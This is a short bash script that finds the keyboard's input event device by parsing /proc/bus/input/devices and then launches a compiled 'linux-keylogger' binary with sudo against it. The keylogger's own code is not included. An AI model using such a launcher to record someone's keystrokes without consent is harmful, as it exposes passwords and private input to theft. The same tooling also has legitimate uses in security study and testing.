#!/bin/bash

# Parse each input block fully
keyboard_event=$(awk '
  BEGIN { RS=""; FS="\n" }
  /AT Translated Set 2 keyboard/ {
    for (i = 1; i <= NF; i++) {
      if ($i ~ /Handlers/) {
        match($i, /event[0-9]+/, ev);
        print ev[0];
        exit;
      }
    }
  }
' /proc/bus/input/devices)

if [[ -z "$keyboard_event" ]]; then
    echo "No keyboard event found."
    exit 1
fi

echo "Found keyboard at /dev/input/$keyboard_event"
sudo ./build/linux-keylogger "/dev/input/$keyboard_event"
